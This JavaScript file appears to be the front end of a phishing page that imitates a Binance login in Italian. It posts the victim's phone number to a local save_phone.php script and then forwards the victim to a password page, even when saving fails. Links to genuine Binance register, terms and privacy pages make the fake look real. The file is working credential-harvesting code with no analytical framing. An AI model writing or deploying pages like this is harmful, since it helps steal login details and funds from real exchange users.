
document.addEventListener('DOMContentLoaded', function() {
    const phoneInput = document.getElementById('phone');
    const submitButton = document.querySelector('.submit-button');
    const form = document.querySelector('.login-form');

    // Reset button state on page load
    function resetButtonState() {
        const buttonText = submitButton.querySelector('.button-text');
        const loadingAnimation = submitButton.querySelector('.loading-animation');
        
        buttonText.style.display = 'inline-block';
        loadingAnimation.style.display = 'none';
        submitButton.disabled = false;
    }

    // Initialize button state
    resetButtonState();

    // Allow only numbers in phone input
    phoneInput.addEventListener('input', function(e) {
        // Remove any non-numeric characters
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    // Prevent non-numeric characters from being typed
    phoneInput.addEventListener('keypress', function(e) {
        if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    });

    // Handle form submission
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const phoneValue = phoneInput.value.trim();
        const buttonText = submitButton.querySelector('.button-text');
        const loadingAnimation = submitButton.querySelector('.loading-animation');
        
        if (!phoneValue) {
            phoneInput.focus();
            return;
        }
        
        if (phoneValue.length < 6) {
            phoneInput.focus();
            return;
        }
        
        // Show loading animation
        buttonText.style.display = 'none';
        loadingAnimation.style.display = 'flex';
        submitButton.disabled = true;
        
        // Send phone to backend
        const formData = new FormData();
        formData.append('phone', phoneValue);
        
        fetch('save_phone.php', {
            method: 'POST',
            body: formData
        }).then(response => response.json())
        .then(data => {
            setTimeout(() => {
                // Reset button state before redirect
                buttonText.style.display = 'inline-block';
                loadingAnimation.style.display = 'none';
                submitButton.disabled = false;
                
                // Redirect to password page with phone number
                window.location.href = `password.html?phone=${encodeURIComponent(phoneValue)}`;
            }, 2000);
        }).catch(error => {
            // Still redirect even if backend fails
            setTimeout(() => {
                buttonText.style.display = 'inline-block';
                loadingAnimation.style.display = 'none';
                submitButton.disabled = false;
                window.location.href = `password.html?phone=${encodeURIComponent(phoneValue)}`;
            }, 2000);
        });
    });

    // Handle footer links redirects
    const createAccountLink = document.querySelector('.create-account-link');
    const cookieLink = document.querySelector('.footer-link[href="#"]');
    const termsLink = document.querySelectorAll('.footer-link[href="#"]')[1];
    const privacyLink = document.querySelectorAll('.footer-link[href="#"]')[2];

    createAccountLink.addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://accounts.binance.com/it/register';
    });

    cookieLink.addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://academy.binance.com/it/articles/what-are-cookies';
    });

    termsLink.addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://www.binance.com/it/terms';
    });

    privacyLink.addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://www.binance.com/it/privacy';
    });

    // Add focus/blur effects
    phoneInput.addEventListener('focus', function() {
        this.parentElement.classList.add('focused');
    });

    phoneInput.addEventListener('blur', function() {
        this.parentElement.classList.remove('focused');
    });

    // Handle responsive behavior
    function handleResize() {
        const container = document.querySelector('.login-container');
        if (window.innerWidth <= 768) {
            container.style.minHeight = `${window.innerHeight - 120}px`;
        } else {
            container.style.minHeight = 'auto';
        }
    }

    window.addEventListener('resize', handleResize);
    handleResize(); // Initial call
});
